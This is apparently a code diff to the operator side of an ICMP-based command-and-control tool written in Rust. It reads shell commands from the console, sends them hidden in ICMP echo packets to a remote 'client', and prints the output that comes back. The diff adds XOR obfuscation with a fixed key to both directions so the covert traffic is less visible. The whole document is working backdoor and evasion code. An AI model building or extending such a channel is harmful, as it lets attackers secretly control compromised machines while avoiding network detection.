@@ -1,32 +1,29 @@
-use std::{
-    net::Ipv4Addr,
-    time::Duration,
-    str::from_utf8,
-    io::stdin
-};
+use std::{io::stdin, net::Ipv4Addr, str::from_utf8, time::Duration};
 
 // TODO
-// xor packets
 // increment sequence
 // replicate second delay between each ping for more consistant behavior
 
+use clap::Parser;
+use functions::crypto::xor;
 use icmp_socket::socket::IcmpSocket;
+use icmp_socket::IcmpSocket4;
 use icmp_socket::Icmpv4Message;
 use icmp_socket::Icmpv4Packet;
-use icmp_socket::IcmpSocket4;
-use clap::Parser;
 
 const TIMEOUT: Duration = Duration::from_secs(5);
 
 const CLIENT_IDENTIFIER: u16 = 0;
 const SERVER_IDENTIFIER: u16 = 1;
 
+const KEY: u8 = 65;
+
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
 struct Args {
     /// IP address to bind to
     #[arg(short, long)]
-    address: Option<String>
+    address: Option<String>,
 }
 
 pub fn main() {
@@ -53,6 +50,12 @@ pub fn main() {
 
         stdin().read_line(&mut command).unwrap();
 
+        let encrypted_payload: Vec<u8> = command
+            .as_bytes()
+            .iter()
+            .map(|byte| xor(*byte, KEY))
+            .collect();
+
         let packet = Icmpv4Packet {
             typ: 8,
             code: 0,
@@ -60,8 +63,8 @@ pub fn main() {
             message: Icmpv4Message::EchoReply {
                 identifier: SERVER_IDENTIFIER,
                 sequence: 1,
-                payload: command.as_bytes().to_vec()
-            }
+                payload: encrypted_payload,
+            },
         };
 
         if let Err(err) = socket.send_to(parsed_addr, packet) {
@@ -74,7 +77,10 @@ pub fn main() {
             let (packet, from_address) = match socket.rcv_from() {
                 Ok(packet) => packet,
                 Err(err) => {
-                    println!("We got no response after {:?}. Most likely a timeout - {:?}", TIMEOUT, err);
+                    println!(
+                        "We got no response after {:?}. Most likely a timeout - {:?}",
+                        TIMEOUT, err
+                    );
                     break;
                 }
             };
@@ -82,22 +88,33 @@ pub fn main() {
             let address = *from_address.as_socket_ipv4().unwrap().ip();
 
             if address == parsed_addr {
-                if let Icmpv4Message::EchoReply { payload, identifier, .. } = packet.message {
+                if let Icmpv4Message::EchoReply {
+                    payload,
+                    identifier,
+                    ..
+                } = packet.message
+                {
                     if identifier != CLIENT_IDENTIFIER {
                         continue;
                     }
 
-                    let to_utf8_from_payload = from_utf8(&payload);
+                    let decrypted_response: Vec<u8> =
+                        payload.iter().map(|byte| xor(*byte, KEY)).collect();
+
+                    let to_utf8_from_payload = from_utf8(&decrypted_response);
 
                     let Ok(command_response) = to_utf8_from_payload else {
-                        println!("Error parsing payload from {}: {:?}", address, to_utf8_from_payload.err().unwrap());
+                        println!(
+                            "Error parsing payload from {}: {:?}",
+                            address,
+                            to_utf8_from_payload.err().unwrap()
+                        );
                         continue;
                     };
 
                     println!(
                         "ICMP response from client! {}\n{}",
-                        address,
-                        command_response
+                        address, command_response
                     );
 
                     break;
